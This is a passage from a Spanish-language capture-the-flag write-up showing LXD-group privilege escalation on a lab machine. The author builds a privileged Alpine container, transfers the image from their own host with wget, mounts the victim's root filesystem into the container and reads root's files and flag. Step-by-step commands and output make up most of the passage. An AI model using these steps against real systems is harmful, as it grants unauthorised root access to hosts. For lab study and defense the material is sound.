| ignite | RUNNING |        XXXX  (eth0) |                     XXXX               (eth0) | CONTAINER | 0         |
+--------+---------+---------------------+-----------------------------------------------+-----------+-----------+

| test   | RUNNING |                     |                     XXXX               (eth0) | CONTAINER | 0         |
+--------+---------+---------------------+-----------------------------------------------+-----------+-----------+
```

* Ejecutando una sesión Shell dentro del **contenedor test**:
```bash
concebolla@tortillapapas:~$ lxc exec test /bin/sh
# whoami
root
# /bin/bash
root@test:~#
```

* También pudimos haber ejecutado una **sesión de Bash**:
```bash
concebolla@tortillapapas:/home/sincebolla$ lxc exec test -- /bin/bash
root@test:~#
```

* Listando los archivos del contenedor:
```bash
root@test:~# ls -lha /mnt/root
total 68K
drwxr-xr-x  18 root root 4.0K Apr 12  2024 .
drwxr-xr-x   3 root root 4.0K Mar 23 07:39 ..
lrwxrwxrwx   1 root root    7 Apr 12  2024 bin -> usr/bin
drwxr-xr-x   3 root root 4.0K Apr 12  2024 boot
drwxr-xr-x  17 root root 3.3K Mar 23 07:37 dev
drwxr-xr-x  74 root root 4.0K Mar 23 04:59 etc
drwxr-xr-x   4 root root 4.0K Apr 13  2024 home
lrwxrwxrwx   1 root root   30 Apr 12  2024 initrd.img -> boot/initrd.img-6.1.0-18-amd64
lrwxrwxrwx   1 root root   30 Apr 12  2024 initrd.img.old -> boot/initrd.img-6.1.0-18-amd64
lrwxrwxrwx   1 root root    7 Apr 12  2024 lib -> usr/lib
lrwxrwxrwx   1 root root    9 Apr 12  2024 lib64 -> usr/lib64
drwx------   2 root root  16K Apr 12  2024 lost+found
drwxr-xr-x   3 root root 4.0K Apr 12  2024 media
drwxr-xr-x   2 root root 4.0K Apr 12  2024 mnt
drwxr-xr-x   2 root root 4.0K Apr 16  2024 opt
dr-xr-xr-x 162 root root    0 Mar 23 04:59 proc
drwx------   4 root root 4.0K Apr 18  2024 root
drwxr-xr-x  22 root root  640 Mar 23 07:37 run
lrwxrwxrwx   1 root root    8 Apr 12  2024 sbin -> usr/sbin
drwxr-xr-x   2 root root 4.0K Apr 12  2024 srv
dr-xr-xr-x  13 root root    0 Mar 23 04:59 sys
drwxrwxrwt   8 root root 4.0K Mar 23 07:39 tmp
drwxr-xr-x  12 root root 4.0K Apr 12  2024 usr
drwxr-xr-x  12 root root 4.0K Apr 12  2024 var
lrwxrwxrwx   1 root root   27 Apr 12  2024 vmlinuz -> boot/vmlinuz-6.1.0-18-amd64
lrwxrwxrwx   1 root root   27 Apr 12  2024 vmlinuz.old -> boot/vmlinuz-6.1.0-18-amd64
```
Observa que se copiaron todos los archivos de la máquina víctima.

Esto quiere decir que podemos ver los archivos del **Root**, incluso la flag:
```bash
root@test:~# cd /mnt/root/root
root@test:/mnt/root/root# ls -la
total 36
drwx------  4 root root 4096 Apr 18  2024 .
drwxr-xr-x 18 root root 4096 Apr 12  2024 ..
lrwxrwxrwx  1 root root    9 Apr 14  2024 .bash_history -> /dev/null
-rw-r--r--  1 root root  571 Apr 10  2021 .bashrc
-rw-------  1 root root   20 Apr 15  2024 .lesshst
drwxr-xr-x  3 root root 4096 Apr 12  2024 .local
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-r--r--  1 root root   66 Apr 18  2024 .selected_editor
drwx------  2 root root 4096 Apr 14  2024 .ssh
-rw-r--r--  1 root root   33 Apr 16  2024 root.txt
root@test:/mnt/root/root# cat root.txt
...
```
Y con esto, terminamos la máquina.

#### Escalando Privilegios Aprovechandonos del Grupo LXD y Sin Internet en la Máquina Víctima {#lxd3}

En el siguiente blog, podemos encontrar una forma de crear una montura de todo el sistema con la herramienta **lxc**, siendo esta una forma en la que NO es necesario tener internet en la máquina víctima:
* <a href="https://www.hackingarticles.in/lxd-privilege-escalation/" target="_blank">Lxd Privilege Escalation</a>

Vamos a aplicar lo que dice el blog por pasos:

* Primero, descargamos la imagen que vamos a utilizar en nuestra máquina:
```bash
git clone  https://github.com/saghul/lxd-alpine-builder.git
Clonando en 'lxd-alpine-builder'...
remote: Enumerating objects: 50, done.
remote: Counting objects: 100% (8/8), done.
remote: Compressing objects: 100% (6/6), done.
remote: Total 50 (delta 2), reused 5 (delta 2), pack-reused 42 (from 1)
Recibiendo objetos: 100% (50/50), 3.11 MiB | 5.63 MiB/s, listo.
Resolviendo deltas: 100% (15/15), listo.
```

* Entramos en el proyecto clonado y ahí debería estar un archivo comprimido que contiene la imagen:
```bash
ls
alpine-v3.13-x86_64-20210218_0139.tar.gz  build-alpine  LICENSE  README.md
```

* En caso de que no lo tenga, ejecuta el archivo `build-alpine`:
```bash
/build-alpine
Determining the latest release... v3.21
Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.21/main/x86_64
Downloading alpine-keys-2.5-r0.apk
...
```

* Enviamos el archivo comprimido a la máquina víctima dentro de la sesión actual, abriendo un servidor con **Python** y utilizando la herramienta **wget**:
```bash
concebolla@tortillapapas:~$ wget http://Tu_IP/alpine-v3.13-x86_64-20210218_0139.tar.gz
--2025-03-23 21:14:01--  http://Tu_IP/alpine-v3.13-x86_64-20210218_0139.tar.gz
Conectando con Tu_IP:80... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 3259593 (3.1M) [application/gzip]
Grabando a: «alpine-v3.13-x86_64-20210218_0139.tar.gz»
.
alpine-v3.13-x86_64-20210218_0139.tar.gz        100%[================>]   3.11M  --.-KB/s    en 0.04s   
.
2025-03-23 21:14:01 (85.7 MB/s) - «alpine-v3.13-x86_64-20210218_0139.tar.gz» guardado [3259593/3259593]
```

* Importamos la imagen:
```bash
concebolla@tortillapapas:~$ lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myImage
Image imported with fingerprint: cd73881adaac667...
```
Nota: aquí había descubierto que existe la misma imagen dentro de la máquina víctima, por lo que, para probar este método, decidí eliminarla con el comando `lxc image delete myimage`.

* Revisamos que la imagen esté instalada:
```bash
concebolla@tortillapapas:~$ lxc image list
+---------+--------------+--------+---------------------------------------------+--------------+-----------+----------+-------------------------------+

|  ALIAS  | FINGERPRINT  | PUBLIC |                 DESCRIPTION                 | ARCHITECTURE |   TYPE    |   SIZE   |          UPLOAD DATE          |
+---------+--------------+--------+---------------------------------------------+--------------+-----------+----------+-------------------------------+

| myimage | cd73881adaac | no     | alpine v3.13 (20210218_01:39)               | x86_64       | CONTAINER | 3.11MB   | Apr 15, 2024 at 11:22am (UTC) |
+---------+--------------+--------+---------------------------------------------+--------------+-----------+----------+-------------------------------+

|         | 712a58368655 | no     | ubuntu 16.04 LTS amd64 (release) (20211001) | x86_64       | CONTAINER | 171.55MB | Mar 23, 2025 at 7:38am (UTC)  |
+---------+--------------+--------+---------------------------------------------+--------------+-----------+----------+-------------------------------+
```
La otra imagen que aparece ahí, es del ejemplo anterior donde ocupamos internet.

* Creando un **contenedor LXC**(`lxc init`) llamado **hackeado** (nombre del contenedor) basado en la imagen **Alpine** que descargamos desde nuestra máquina y configurándolo como privilegiado (`-c security.privileged=true`):
```bash
concebolla@tortillapapas:~$ lxc init myImage hackeado -c security.privileged=true
Creating hackeado
```

* Revisamos que se haya creado el contenedor:
```bash
concebolla@tortillapapas:~$ lxc ls
+----------+---------+---------------------+-----------------------------------------------+-----------+-----------+

|   NAME   |  STATE  |        IPV4         |                     IPV6                      |   TYPE    | SNAPSHOTS |
+----------+---------+---------------------+-----------------------------------------------+-----------+-----------+

| hackeado | STOPPED |                     |                                               | CONTAINER | 0         |
+----------+---------+---------------------+-----------------------------------------------+-----------+-----------+

| ignite   | RUNNING |        XXXX  (eth0) |                     XXXX               (eth0) | CONTAINER | 0         |
+----------+---------+---------------------+-----------------------------------------------+-----------+-----------+

| test     | RUNNING |                     |                     XXXX               (eth0) | CONTAINER | 0         |
+----------+---------+---------------------+-----------------------------------------------+-----------+-----------+
```
Ahí está el contenedor del ejemplo anterior.

* Montando el sistema de archivos del host dentro del **contenedor LXC** llamado **hackeado**:
```bash
concebolla@tortillapapas:~$ lxc config device add hackeado hack2 disk source=/ path=/mnt/root recursive=true
Device hack2 added to hackeado
```
Aquí `lxc config device add` agrega un dispositivo al **contenedor hackeado**, el nombre **hackeado** es el que se le asignó al dispositivo agregado, **disk** define el tipo de dispositivo siendo este caso un **disco (filesystem)**, `source=/` crea la montura de la raíz del host dentro del contenedor, `path=/mnt/root` indica que la montura quedara dentro del contenedor en la ruta `/mnt/root`, y por último recursive=true incluye todo el contenido de `/`, permitiendo el acceso recursivo a todos los archivos y subdirectorios.

* Iniciando el contenedor y listando los contenedores activos:
```bash
concebolla@tortillapapas:~$ lxc start hackeado
concebolla@tortillapapas:~$ lxc ls
+----------+---------+---------------------+-----------------------------------------------+-----------+-----------+

|   NAME   |  STATE  |        IPV4         |                     IPV6                      |   TYPE    | SNAPSHOTS |
+----------+---------+---------------------+-----------------------------------------------+-----------+-----------+

| hackeado | RUNNING |        XXXX  (eth0) |                     XXXX               (eth0) | CONTAINER | 0         |
+----------+---------+---------------------+-----------------------------------------------+-----------+-----------+

| ignite   | RUNNING |        XXXX  (eth0) |                     XXXX               (eth0) | CONTAINER | 0         |
+----------+---------+---------------------+-----------------------------------------------+-----------+-----------+

| test     | RUNNING |                     |                     XXXX               (eth0) | CONTAINER | 0         |
+----------+---------+---------------------+-----------------------------------------------+-----------+-----------+
```

* Ejecutando una sesión Shell dentro del **contenedor hackeado**:
```bash
concebolla@tortillapapas:~$ lxc exec hackeado -- /bin/sh
~ # whoami
root
```
En este caso, no podremos obtener una **sesión de Bash** por el tipo de imagen que usamos.

* Podemos ver los mismos archivos del **Root** de la máquina víctima y podemos volver a obtener la **flag del Root**:
```bash
~ # cd /mnt/root/root
/mnt/root/root # ls -la
total 36
drwx------    4 root     root          4096 Apr 18  2024 .
drwxr-xr-x   18 root     root          4096 Apr 12  2024 ..
lrwxrwxrwx    1 root     root             9 Apr 14  2024 .bash_history -> /dev/null
-rw-r--r--    1 root     root           571 Apr 10  2021 .bashrc
-rw-------    1 root     root            20 Apr 15  2024 .lesshst
drwxr-xr-x    3 root     root          4096 Apr 12  2024 .local
-rw-r--r--    1 root     root           161 Jul  9  2019 .profile
-rw-r--r--    1 root     root            66 Apr 18  2024 .selected_editor
drwx------    2 root     root          4096 Apr 14  2024 .ssh
-rw-r--r--    1 root     root            33 Apr 16  2024 root.txt
/mnt/root/root # cat root.txt
...
```
Y con esto, completamos la máquina.
